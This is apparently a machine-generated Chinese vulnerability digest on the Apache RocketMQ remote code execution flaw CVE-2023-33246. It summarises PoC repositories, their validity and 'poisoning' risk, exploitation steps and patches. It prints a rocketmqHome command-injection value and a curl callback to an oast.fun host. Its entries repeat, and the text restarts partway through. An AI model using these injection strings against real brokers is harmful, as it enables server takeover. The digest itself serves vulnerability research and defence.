**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。攻击者可以通过更新RocketMQ的配置，注入恶意命令，从而以运行RocketMQ的用户身份执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的POC代码是有效的。漏洞库信息和搜索引擎结果表明该漏洞已经被广泛关注，并且存在公开的漏洞利用代码。POC代码通过修改`rocketmqHome`属性，注入包含反弹shell的命令。

**投毒风险：**
此仓库中存在作者隐藏的投毒代码的可能性较低，大概为10%。
*   `README.md` 仅包含漏洞说明和截图，没有可疑代码。
*   `pom.xml` 定义了项目依赖，只依赖了`rocketmq-client`，没有引入其他恶意的依赖项。
*   `src/main/java/org/example/Main.java` 是漏洞利用的主要代码，虽然代码本身利用漏洞进行远程代码执行，但没有发现其他额外的恶意行为。
urls数组包含的地址可能存在恶意，但是这些地址可以自行修改，不是仓库本身自带的恶意代码。

**利用方式：**
1.  **目标确认:** 确定目标RocketMQ服务的NameServer地址。
2.  **构造恶意配置：** 利用DefaultMQAdminExt工具，构造包含恶意命令的Properties对象。关键在于修改`rocketmqHome`参数，将其设置为包含命令注入的字符串。POC中使用了`-c $@|sh . echo ping chr17sz2vtc0000ymdaggehyuhhyyyyyb.oast.fun;`作为示例，攻击者可以替换为任何希望执行的命令。
3.  **更新Broker配置：** 使用`admin.updateBrokerConfig()`方法将恶意配置发送到目标Broker。由于漏洞存在于未授权访问，攻击者可以绕过身份验证直接发送配置。
4.  **命令执行：** Broker在处理更新后的配置时，会执行`rocketmqHome`参数中的恶意命令，实现远程代码执行。

**缓解措施：**
*   升级到RocketMQ 5.1.1或更高版本(5.x分支)，或4.9.6或更高版本(4.x分支)。
*   对RocketMQ组件（NameServer、Broker、Controller）进行严格的权限控制，避免暴露在公网上。

**项目地址:** [I5N0rth/CVE-2023-33246](https://github.com/I5N0rth/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #5

**来源**: [CVE-2023-33246-Le1a_CVE-2023-33246.md](../2023/CVE-2023-33246-Le1a_CVE-2023-33246.md)

## CVE-2023-33246 - Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要目标RocketMQ服务暴露在网络上，且无权限验证或存在可绕过的权限验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以通过以下方式利用该漏洞：

1.  **利用方式:**  通过更新配置功能执行任意命令。RocketMQ的NameServer、Broker和Controller组件如果暴露在公网上且缺乏权限验证，攻击者可以通过更新配置的方式，执行任意系统命令，从而控制服务器。或者通过伪造RocketMQ协议内容也可以达到同样的效果。
2.  **POC有效性:**  提供的POC代码（java -jar CVE-2023-33246.jar -ip \"127.0.0.1:10911\" -cmd \"open -a Calculator\"）尝试利用此漏洞。该POC声称会在35秒延时后执行命令，并自动还原配置，以减少对目标环境的影响。基于漏洞描述，此POC代码应该有效。
3. **投毒风险评估:**

分析漏洞利用代码中的 README.md 文件，可以看到以下几点：

*   **自动化还原配置:** 工具声称在利用漏洞后会自动还原配置，以避免持久性影响。但此操作依赖程序正确运行完成，若中途强制关闭可能无法还原。
*   **延时执行:** 为了确保漏洞被触发，工具设置了35秒的延时，这个延时可以解释为等待心跳机制触发漏洞利用。

**风险评估:**

*   **较高风险:**  该工具可以执行任意命令，因此如果被恶意修改，可以植入后门、窃取数据或进行其他恶意活动。
*   **低度混淆:**  目前的代码没有明显的混淆或隐藏恶意功能的行为。

综上所述，虽然POC代码本身似乎是为了方便利用漏洞而编写，但仍存在一定的投毒风险。恶意攻击者可以修改该POC，在执行命令前后添加恶意代码，例如植入后门或窃取敏感信息。此外，如果工具在执行过程中被中断，自动还原配置的功能可能失效，导致目标系统配置被恶意更改。因此, 判定存在10%的投毒风险。

**项目地址:** [Le1a/CVE-2023-33246](https://github.com/Le1a/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #6

**来源**: [CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md](../2023/CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ NameServer、Broker 或 Controller 组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息和搜索结果，该漏洞是由于 RocketMQ 的某些组件（NameServer、Broker、Controller）暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，获得服务器的控制权限。

**有效性:**
提供的 POC 代码 `CVE-2023-33246_RocketMQ_RCE_EXPLOIT.py` 通过 socket 连接到目标 RocketMQ 服务，构造包含恶意命令的 payload 并发送，从而实现远程代码执行。根据搜索结果，该漏洞已经被积极利用，POC 代码的有效性较高。

**投毒风险:**
查看提供的 POC 代码，该脚本主要功能是构造并发送恶意 payload，执行指定的命令。经过分析，未发现明显的投毒代码，例如下载执行恶意文件或篡改系统配置等操作。因此，认为该仓库中存在作者隐藏的投毒代码的概率较低，约为 0%。

**利用方式:**
1.  **目标确定:** 确定目标 RocketMQ 服务的 IP 地址和端口（默认端口可能为 9876）。
2.  **Payload 构造:** 使用 POC 脚本，指定要执行的命令。POC 脚本会将命令嵌入到特定的 RocketMQ 协议格式中，构造恶意的 payload。
3.  **发送 Payload:** POC 脚本通过 socket 连接到目标 RocketMQ 服务，并将构造的 payload 发送过去。
4.  **命令执行:** 如果目标 RocketMQ 服务存在漏洞且未进行修复，它将解析并执行 payload 中的命令，从而实现远程代码执行。

**项目地址:** [Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT](https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #7

**来源**: [CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md](../2023/CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ Broker组件暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 存在于 Apache RocketMQ 5.1.0 及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 等组件暴露在公网上，且缺乏权限验证，攻击者可以利用 update configuration 功能，或通过伪造 RocketMQ 协议内容，以 RocketMQ 运行的系统用户身份执行任意命令。

**有效性：**

根据漏洞信息和搜索结果，该漏洞是一个已知的、被积极利用的远程代码执行漏洞。CISA 已将其添加到已知被利用的漏洞目录中。存在公开可用的PoC利用代码。

**投毒风险：**

PoC代码主要包含版本检测脚本（`RocketMQRceCheck`）和漏洞利用脚本（`RocketMQ_RCE_EXPLOIT`）。

*   版本检测脚本：用于检查目标 RocketMQ 服务的版本，判断是否存在漏洞。
*   漏洞利用脚本：通过发送恶意配置更新请求，或伪造 RocketMQ 协议，来执行任意命令。

README.md 文件中给出的利用方式是直接执行命令，例如 `curl chw9ft72vtc00002z5k0ge6rz7eyyyyyb.oast.fun/test`。这种利用方式本身不包含明显的投毒代码，但攻击者可以通过替换命令为恶意payload来达到投毒目的，例如下载并执行恶意脚本。另外检测脚本理论上也可以携带恶意payload，但可能性较低，因为check的目的是检查，携带恶意代码容易被发现。

考虑到代码仓库的作者可能会在利用脚本中嵌入后门，或使用隐蔽的方式执行恶意操作，因此存在一定的投毒风险，风险程度大约为10%。

**利用方式：**

1.  **组件暴露：**  攻击者首先需要确定目标 RocketMQ 的相关组件（如 Broker）暴露在公网上。
2.  **版本检测：**  攻击者可以使用 `RocketMQRceCheck` 脚本或其他方法来检测目标 RocketMQ 服务的版本，确认是否存在漏洞。
3.  **RCE利用：**
    *   **更新配置：** 攻击者可以利用 update configuration 功能，发送包含恶意命令的配置更新请求。  该命令将会被目标服务器执行。
    *   **协议伪造：** 攻击者还可以伪造 RocketMQ 协议内容，发送恶意请求到目标服务器，从而执行任意命令。通常命令执行的结果会通过外连的方式传回，例如利用curl命令将结果发送到攻击者控制的服务器上。
4.  **命令执行：**  成功利用漏洞后，攻击者可以以 RocketMQ 运行的系统用户身份执行任意命令，例如安装恶意软件、窃取敏感数据等。

**项目地址:** [MkJos/CVE-2023-33246_RocketMQ_RCE_EXP](https://github.com/MkJos/CVE-2023-33246_RocketMQ_RCE_EXP)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #8

**来源**: [CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md](../2023/CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ组件（NameServer, Broker, Controller）暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是一个Apache RocketMQ中的远程代码执行漏洞。漏洞存在于5.1.0及更早版本中。由于RocketMQ的某些组件在公网暴露且缺乏权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能：** 攻击者可以利用`updateBrokerConfig`方法，通过修改配置参数（例如`rocketmqHome`）来执行任意命令。POC代码中的`Main.java`文件演示了如何通过设置`rocketmqHome`属性来执行shell命令或反弹shell。

2.  **伪造RocketMQ协议内容：** 攻击者可以构造恶意的RocketMQ协议内容，绕过身份验证，从而执行命令。


**漏洞利用方式：**

1.  攻击者首先需要确定目标RocketMQ服务的NameServer地址。
2.  然后，攻击者可以使用POC代码中的`updateConfig`方法，修改Broker的配置，例如`rocketmqHome`，将其设置为包含恶意命令的字符串。
3.  RocketMQ服务在读取并应用新的配置时，会执行攻击者注入的命令。


**投毒风险分析：**

该POC代码的主要目的是演示漏洞的利用和缓解方法。`README.md`文件表明该项目旨在提供CVE-2023-33246的缓解措施，并且`BrokerConfig.java`文件包含了对`RocketmqHome`参数的增强验证。

`Main.java`包含用于攻击测试的代码，虽然用于演示漏洞利用，但不应被认为是投毒代码。

但是，仍然存在一些风险：

*   **潜在的供应链风险：** 依赖项`rocketmq-client`和`rocketmq-tools`可能存在未知的漏洞，虽然概率较低，但存在一定风险。
*   **代码缺陷：** 代码中可能存在未知的bug，可能被攻击者利用。
*   **误用：** 用户可能错误地将此代码部署到生产环境，导致安全风险。

因此，评估投毒风险为10%。大多数代码用于漏洞验证和防御，但依赖项和其他潜在问题始终存在一定风险。


**项目地址:** [PavilionQ/CVE-2023-33246-mitigation](https://github.com/PavilionQ/CVE-2023-33246-mitigation)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #9

**来源**: [CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md](../2023/CVE-2023-33246-Sumitpathania03_Apache-RocketMQ-CVE-2023-33246-.md)

# CVE-2023-33246

> 📦 该CVE有 **13** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2023-33246-0xKayala_CVE-2023-33246.md](../2023/CVE-2023-33246-0xKayala_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer, Broker, 和 Controller 组件暴露在公网，且缺少权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息，如果 RocketMQ 的某些组件（如 NameServer、Broker 和 Controller）暴露在公网上，并且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，从而完全控制服务器。

**有效性：**

根据CISA KEV收录信息, 此漏洞在野外被积极利用，证明其有效性。
提供的漏洞利用代码 `check.py` 是一个版本检测脚本，它通过连接目标端口并发送特定请求来判断 RocketMQ 的版本。虽然这个脚本本身并不能直接执行远程命令，但它可以用来确认目标是否为易受攻击的版本。

**投毒风险：**

查看 `check.py` 代码，主要是进行版本检测，虽然代码量比较大，但是没有发现明显的恶意代码或后门。代码中包含了大量 RocketMQ 的版本字符串，用于进行版本比对。 线程池用于并发扫描IP，网络请求部分使用了标准库，没有发现可疑的操作。因此，投毒风险较低，估计在 10% 左右。

**利用方式：**

1.  **版本检测：** 使用 `check.py` 脚本或其他方法检测目标 RocketMQ 实例的版本是否在受影响范围内（<= 5.1.0）。
2.  **漏洞利用：** 如果目标版本易受攻击，攻击者可以利用以下两种方式执行远程命令：
    *   **更新配置功能：** 攻击者可以利用未授权的访问权限，通过更新 RocketMQ 的配置来插入恶意命令。
    *   **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议数据包，发送给目标服务器，从而触发远程命令执行。

**修复建议：**

*   升级到 RocketMQ 5.1.1 或更高版本（如果使用 RocketMQ 5.x）。
*   升级到 RocketMQ 4.9.6 或更高版本（如果使用 RocketMQ 4.x）。
*   对暴露在公网的 RocketMQ 组件进行严格的权限控制和访问验证。

**项目地址:** [0xKayala/CVE-2023-33246](https://github.com/0xKayala/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #2

**来源**: [CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md](../2023/CVE-2023-33246-4mazing_CVE-2023-33246-Copy.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。由于 RocketMQ 的多个组件（NameServer、Broker 和 Controller）可能暴露在公网上且缺乏适当的权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **更新配置功能：** 攻击者可以利用更新配置功能，通过发送恶意配置来执行任意命令，命令以 RocketMQ 运行用户的身份执行。
2.  **伪造 RocketMQ 协议内容：** 攻击者可以构造恶意的 RocketMQ 协议内容，达到执行命令的目的。

提供的漏洞利用代码是一个环境搭建的说明文档，引用了其他利用代码仓库。代码本身没有包含直接的漏洞利用payload，但给出了搭建漏洞环境的方法，参考链接包含着漏洞利用代码，因此可以判断该漏洞的POC是有效的。

**投毒风险分析：**

此仓库主要提供了环境搭建和参考链接，本身不包含直接的攻击代码，但间接引导用户使用参考链接中的POC。 如果参考链接的POC被植入恶意代码(例如反弹shell到恶意IP)，则存在投毒风险。由于无法直接评估参考链接的安全性，这里给出一个相对保守的估计，投毒风险的可能性为 10%。 这个风险主要来自于用户下载和使用来自不可信来源的POC。

**漏洞利用方式总结：**

1.  **漏洞定位：** 确定目标系统运行着受影响版本的 Apache RocketMQ，并且相关组件暴露在公网上。
2.  **攻击向量选择：** 选择利用更新配置功能或伪造 RocketMQ 协议内容这两种方式之一。
3.  **构造 Payload：** 构造包含恶意命令的 Payload。例如，如果利用更新配置功能，则需要构造能够执行任意命令的配置信息。如果伪造 RocketMQ 协议，则需要构造符合 RocketMQ 协议格式的恶意数据。
4.  **发送 Payload：** 将构造好的 Payload 发送到目标系统的 RocketMQ 组件。
5.  **执行命令：** 目标系统执行 Payload 中的命令，攻击者从而获得对系统的控制。

搜索引擎结果表明该漏洞已被广泛关注，并存在被利用的风险。CISA 也将此漏洞添加到已知被利用漏洞目录中，表明该漏洞具有较高的实际危害。

**项目地址:** [4mazing/CVE-2023-33246-Copy](https://github.com/4mazing/CVE-2023-33246-Copy)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #3

**来源**: [CVE-2023-33246-AiK1d_CVE-2023-33246.md](../2023/CVE-2023-33246-AiK1d_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可执行任意命令

**影响版本:** <= 5.1.0

**利用条件:** 需要RocketMQ组件暴露在公网且缺乏权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行 (RCE) 漏洞。该漏洞存在于5.1.0及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 组件暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，权限与 RocketMQ 运行的用户相同。提供的POC代码是一个检测工具，用于扫描目标是否存在漏洞。根据代码内容判断，投毒风险较低,因为只是检测是否存在漏洞。搜索引擎结果显示此漏洞已被广泛利用，并被添加到CISA的已知被利用漏洞目录中。利用方式包括更新配置和伪造协议内容。

**项目地址:** [AiK1d/CVE-2023-33246](https://github.com/AiK1d/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #4

**来源**: [CVE-2023-33246-I5N0rth_CVE-2023-33246.md](../2023/CVE-2023-33246-I5N0rth_CVE-2023-33246.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ的NameServer、Broker或Controller组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。攻击者可以通过更新RocketMQ的配置，注入恶意命令，从而以运行RocketMQ的用户身份执行任意代码。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，该漏洞的POC代码是有效的。漏洞库信息和搜索引擎结果表明该漏洞已经被广泛关注，并且存在公开的漏洞利用代码。POC代码通过修改`rocketmqHome`属性，注入包含反弹shell的命令。

**投毒风险：**
此仓库中存在作者隐藏的投毒代码的可能性较低，大概为10%。
*   `README.md` 仅包含漏洞说明和截图，没有可疑代码。
*   `pom.xml` 定义了项目依赖，只依赖了`rocketmq-client`，没有引入其他恶意的依赖项。
*   `src/main/java/org/example/Main.java` 是漏洞利用的主要代码，虽然代码本身利用漏洞进行远程代码执行，但没有发现其他额外的恶意行为。
urls数组包含的地址可能存在恶意，但是这些地址可以自行修改，不是仓库本身自带的恶意代码。

**利用方式：**
1.  **目标确认:** 确定目标RocketMQ服务的NameServer地址。
2.  **构造恶意配置：** 利用DefaultMQAdminExt工具，构造包含恶意命令的Properties对象。关键在于修改`rocketmqHome`参数，将其设置为包含命令注入的字符串。POC中使用了`-c $@|sh . echo ping chr17sz2vtc0000ymdaggehyuhhyyyyyb.oast.fun;`作为示例，攻击者可以替换为任何希望执行的命令。
3.  **更新Broker配置：** 使用`admin.updateBrokerConfig()`方法将恶意配置发送到目标Broker。由于漏洞存在于未授权访问，攻击者可以绕过身份验证直接发送配置。
4.  **命令执行：** Broker在处理更新后的配置时，会执行`rocketmqHome`参数中的恶意命令，实现远程代码执行。

**缓解措施：**
*   升级到RocketMQ 5.1.1或更高版本(5.x分支)，或4.9.6或更高版本(4.x分支)。
*   对RocketMQ组件（NameServer、Broker、Controller）进行严格的权限控制，避免暴露在公网上。

**项目地址:** [I5N0rth/CVE-2023-33246](https://github.com/I5N0rth/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #5

**来源**: [CVE-2023-33246-Le1a_CVE-2023-33246.md](../2023/CVE-2023-33246-Le1a_CVE-2023-33246.md)

## CVE-2023-33246 - Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** 需要目标RocketMQ服务暴露在网络上，且无权限验证或存在可绕过的权限验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是Apache RocketMQ中的一个远程代码执行漏洞。根据漏洞库信息和搜索结果，攻击者可以通过以下方式利用该漏洞：

1.  **利用方式:**  通过更新配置功能执行任意命令。RocketMQ的NameServer、Broker和Controller组件如果暴露在公网上且缺乏权限验证，攻击者可以通过更新配置的方式，执行任意系统命令，从而控制服务器。或者通过伪造RocketMQ协议内容也可以达到同样的效果。
2.  **POC有效性:**  提供的POC代码（java -jar CVE-2023-33246.jar -ip \"127.0.0.1:10911\" -cmd \"open -a Calculator\"）尝试利用此漏洞。该POC声称会在35秒延时后执行命令，并自动还原配置，以减少对目标环境的影响。基于漏洞描述，此POC代码应该有效。
3. **投毒风险评估:**

分析漏洞利用代码中的 README.md 文件，可以看到以下几点：

*   **自动化还原配置:** 工具声称在利用漏洞后会自动还原配置，以避免持久性影响。但此操作依赖程序正确运行完成，若中途强制关闭可能无法还原。
*   **延时执行:** 为了确保漏洞被触发，工具设置了35秒的延时，这个延时可以解释为等待心跳机制触发漏洞利用。

**风险评估:**

*   **较高风险:**  该工具可以执行任意命令，因此如果被恶意修改，可以植入后门、窃取数据或进行其他恶意活动。
*   **低度混淆:**  目前的代码没有明显的混淆或隐藏恶意功能的行为。

综上所述，虽然POC代码本身似乎是为了方便利用漏洞而编写，但仍存在一定的投毒风险。恶意攻击者可以修改该POC，在执行命令前后添加恶意代码，例如植入后门或窃取敏感信息。此外，如果工具在执行过程中被中断，自动还原配置的功能可能失效，导致目标系统配置被恶意更改。因此, 判定存在10%的投毒风险。

**项目地址:** [Le1a/CVE-2023-33246](https://github.com/Le1a/CVE-2023-33246)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #6

**来源**: [CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md](../2023/CVE-2023-33246-Malayke_CVE-2023-33246_RocketMQ_RCE_EXPLOIT.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ NameServer、Broker 或 Controller 组件暴露在公网，且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2023-33246 是 Apache RocketMQ 中的一个远程代码执行漏洞。根据漏洞信息和搜索结果，该漏洞是由于 RocketMQ 的某些组件（NameServer、Broker、Controller）暴露在公网且缺乏权限验证，攻击者可以通过更新配置功能或伪造 RocketMQ 协议内容来执行任意命令，获得服务器的控制权限。

**有效性:**
提供的 POC 代码 `CVE-2023-33246_RocketMQ_RCE_EXPLOIT.py` 通过 socket 连接到目标 RocketMQ 服务，构造包含恶意命令的 payload 并发送，从而实现远程代码执行。根据搜索结果，该漏洞已经被积极利用，POC 代码的有效性较高。

**投毒风险:**
查看提供的 POC 代码，该脚本主要功能是构造并发送恶意 payload，执行指定的命令。经过分析，未发现明显的投毒代码，例如下载执行恶意文件或篡改系统配置等操作。因此，认为该仓库中存在作者隐藏的投毒代码的概率较低，约为 0%。

**利用方式:**
1.  **目标确定:** 确定目标 RocketMQ 服务的 IP 地址和端口（默认端口可能为 9876）。
2.  **Payload 构造:** 使用 POC 脚本，指定要执行的命令。POC 脚本会将命令嵌入到特定的 RocketMQ 协议格式中，构造恶意的 payload。
3.  **发送 Payload:** POC 脚本通过 socket 连接到目标 RocketMQ 服务，并将构造的 payload 发送过去。
4.  **命令执行:** 如果目标 RocketMQ 服务存在漏洞且未进行修复，它将解析并执行 payload 中的命令，从而实现远程代码执行。

**项目地址:** [Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT](https://github.com/Malayke/CVE-2023-33246_RocketMQ_RCE_EXPLOIT)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #7

**来源**: [CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md](../2023/CVE-2023-33246-MkJos_CVE-2023-33246_RocketMQ_RCE_EXP.md)

## CVE-2023-33246 Apache RocketMQ 远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，允许未经授权的远程代码执行

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ Broker组件暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246 存在于 Apache RocketMQ 5.1.0 及更早版本中。由于 RocketMQ 的 NameServer、Broker 和 Controller 等组件暴露在公网上，且缺乏权限验证，攻击者可以利用 update configuration 功能，或通过伪造 RocketMQ 协议内容，以 RocketMQ 运行的系统用户身份执行任意命令。

**有效性：**

根据漏洞信息和搜索结果，该漏洞是一个已知的、被积极利用的远程代码执行漏洞。CISA 已将其添加到已知被利用的漏洞目录中。存在公开可用的PoC利用代码。

**投毒风险：**

PoC代码主要包含版本检测脚本（`RocketMQRceCheck`）和漏洞利用脚本（`RocketMQ_RCE_EXPLOIT`）。

*   版本检测脚本：用于检查目标 RocketMQ 服务的版本，判断是否存在漏洞。
*   漏洞利用脚本：通过发送恶意配置更新请求，或伪造 RocketMQ 协议，来执行任意命令。

README.md 文件中给出的利用方式是直接执行命令，例如 `curl chw9ft72vtc00002z5k0ge6rz7eyyyyyb.oast.fun/test`。这种利用方式本身不包含明显的投毒代码，但攻击者可以通过替换命令为恶意payload来达到投毒目的，例如下载并执行恶意脚本。另外检测脚本理论上也可以携带恶意payload，但可能性较低，因为check的目的是检查，携带恶意代码容易被发现。

考虑到代码仓库的作者可能会在利用脚本中嵌入后门，或使用隐蔽的方式执行恶意操作，因此存在一定的投毒风险，风险程度大约为10%。

**利用方式：**

1.  **组件暴露：**  攻击者首先需要确定目标 RocketMQ 的相关组件（如 Broker）暴露在公网上。
2.  **版本检测：**  攻击者可以使用 `RocketMQRceCheck` 脚本或其他方法来检测目标 RocketMQ 服务的版本，确认是否存在漏洞。
3.  **RCE利用：**
    *   **更新配置：** 攻击者可以利用 update configuration 功能，发送包含恶意命令的配置更新请求。  该命令将会被目标服务器执行。
    *   **协议伪造：** 攻击者还可以伪造 RocketMQ 协议内容，发送恶意请求到目标服务器，从而执行任意命令。通常命令执行的结果会通过外连的方式传回，例如利用curl命令将结果发送到攻击者控制的服务器上。
4.  **命令执行：**  成功利用漏洞后，攻击者可以以 RocketMQ 运行的系统用户身份执行任意命令，例如安装恶意软件、窃取敏感数据等。

**项目地址:** [MkJos/CVE-2023-33246_RocketMQ_RCE_EXP](https://github.com/MkJos/CVE-2023-33246_RocketMQ_RCE_EXP)

**漏洞详情:** [CVE-2023-33246](https://nvd.nist.gov/vuln/detail/CVE-2023-33246)

---

## POC #8

**来源**: [CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md](../2023/CVE-2023-33246-PavilionQ_CVE-2023-33246-mitigation.md)

## CVE-2023-33246-Apache RocketMQ-远程代码执行

**漏洞编号:** CVE-2023-33246

**漏洞类型:** 远程代码执行

**影响应用:** Apache RocketMQ

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** <= 5.1.0

**利用条件:** RocketMQ组件（NameServer, Broker, Controller）暴露在公网且未进行权限验证

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2023-33246是一个Apache RocketMQ中的远程代码执行漏洞。漏洞存在于5.1.0及更早版本中。由于RocketMQ的某些组件在公网暴露且缺乏权限验证，攻击者可以通过以下两种方式利用此漏洞：

1.  **利用更新配置功能：** 攻击者可以利用`updateBrokerConfig`方法，通过修改配置参数（例如`rocketmqHome`）来执行任意命令。POC代码中的`Main.java`文件演示了如何通过设置`rocketmqHome`属性来执行shell命令或反弹shell。

2.  **伪造RocketMQ协议内容：** 攻击者可以构造恶意的RocketMQ协议内容，绕过身份验证，从而执行命令。


**漏洞利用方式：**

1.  攻击者首先需要确定目标RocketMQ服务的NameServer地址。
2.  然后，攻击者可以使用POC代码中的`updateConfig`方法，修改Broker的配置，例如`rocketmqHome`，将其设置为包含恶意命令的字符串。
